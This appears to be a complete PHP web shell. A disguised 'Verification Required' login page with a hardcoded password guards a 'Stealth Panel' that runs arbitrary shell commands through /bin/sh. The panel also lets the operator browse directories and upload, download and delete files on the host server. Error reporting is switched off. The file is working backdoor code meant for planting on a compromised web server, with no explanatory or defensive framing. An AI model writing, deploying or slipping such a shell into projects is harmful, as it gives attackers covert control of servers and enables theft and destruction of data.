<?php
error_reporting(0);
session_start();

$password = "wiredmouseis";   

// ====================== LOGIN PAGE ======================
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    if (isset($_POST['key']) && $_POST['key'] === $password) {
        $_SESSION['auth'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit();
    }
    die('
    <!DOCTYPE html>
    <html>
    <head><title>Index</title>
    <style>
        body{background:#f8f9fa;color:#333;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
        .box{background:white;padding:40px 30px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.1);text-align:center;width:350px;}
        input{width:100%;padding:15px;font-size:17px;border:1px solid #999;border-radius:5px;margin:10px 0;}
        button{width:100%;padding:14px;background:#0066cc;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;}
    </style>
    </head>
    <body>
        <div class="box">
            <h3>Verification Required</h3>
            <form method="post">
                <input type="password" name="key" placeholder="Enter access code" autofocus>
                <button type="submit">Continue</button>
            </form>
        </div>
    </body>
    </html>');
}

// ====================== MAIN PANEL ======================
$dir = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
if (!is_dir($dir)) $dir = getcwd();
chdir($dir);

$cmd = $_GET['c'] ?? '';
?>

<!DOCTYPE html>
<html>
<head>
    <title>Dashboard</title>
    <style>
        body { background:#0a0a0a; color:#ddd; font-family:Consolas; margin:0; padding:15px; }
        .header { background:#111; padding:12px; margin:-15px -15px 15px -15px; display:flex; justify-content:space-between; }
        input[type=text] { width:70%; padding:12px; background:#111; border:1px solid #0f0; color:#0f0; }
        button { padding:12px 25px; background:#111; border:1px solid #0f0; color:#0f0; }
        .output { background:#000; padding:15px; border:1px solid #333; margin:10px 0; white-space:pre-wrap; }
        table { width:100%; border-collapse:collapse; }
        th, td { padding:8px; border-bottom:1px solid #333; }
        tr:hover { background:#1a1a1a; }
    </style>
</head>
<body>

<div class="header">
    <h3>Stealth Panel</h3>
    <a href="?logout=1" style="color:red;">Logout</a>
</div>

<!-- Command Shell -->
<h4>Command Execution</h4>
<form method="GET">
    <input type="text" name="c" placeholder="id || whoami || ls -la || pwd" autofocus>
    <button type="submit">Run</button>
</form>

<?php if($cmd): ?>
<div class="output">
    <b>→ <?=htmlspecialchars($cmd)?></b><br><br>
    <?php
    $out = '/tmp/o'.rand(10000,99999).'.txt';
    if(function_exists('pcntl_fork') && function_exists('pcntl_exec')){
        $pid = pcntl_fork();
        if($pid == 0){
            pcntl_exec('/bin/sh', ['-c', $cmd." > $out 2>&1"]);
            exit();
        }
        sleep(2);
    }
    $res = file_exists($out) ? file_get_contents($out) : '';
    @unlink($out);
    echo nl2br(htmlspecialchars($res ?: "No output"));
    ?>
</div>
<?php endif; ?>

<!-- File Manager -->
<h4>File Manager - <?=htmlspecialchars(basename($dir))?></h4>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="ufile"> 
    <button type="submit">Upload</button>
</form>

<?php
if(isset($_FILES['ufile'])){
    $target = $dir . '/' . basename($_FILES['ufile']['name']);
    echo move_uploaded_file($_FILES['ufile']['tmp_name'], $target) ? "<b style='color:lime'>✓ Uploaded</b>" : "<b style='color:red'>✗ Failed</b>";
}

if(isset($_GET['del'])){
    $p = $dir.'/'.$_GET['del'];
    if(is_file($p)) unlink($p);
    header("Location: ?d=".urlencode($dir));
    exit;
}
?>

<table border="1" cellpadding="8" width="100%" style="border-collapse:collapse;">
    <tr><th>Name</th><th>Type</th><th>Size</th><th>Action</th></tr>
    <?php 
    foreach(scandir($dir) as $f): 
        if($f == "." || $f == "..") continue;
        $full = $dir.'/'.$f;
        $isdir = is_dir($full);
    ?>
    <tr>
        <td>
            <?php if($isdir): ?>
                <a href="?d=<?=urlencode($full)?>">📁 <?=htmlspecialchars($f)?></a>
            <?php else: ?>
                <a href="?d=<?=urlencode($dir)?>&download=<?=urlencode($f)?>">📄 <?=htmlspecialchars($f)?></a>
            <?php endif; ?>
        </td>
        <td><?= $isdir ? 'Folder' : 'File' ?></td>
        <td><?= $isdir ? '-' : round(filesize($full)/1024,2).' KB' ?></td>
        <td><?= !$isdir ? '<a href="?del='.urlencode($f).'&d='.urlencode($dir).'" style="color:red;" onclick="return confirm(\'Delete?\')">Delete</a>' : '' ?></td>
    </tr>
    <?php endforeach; ?>
</table>

<?php
if(isset($_GET['download'])){
    $file = $dir.'/'.$_GET['download'];
    if(file_exists($file)){
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        readfile($file); exit;
    }
}
if(isset($_GET['logout'])){
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}
?>
</body>
</html>
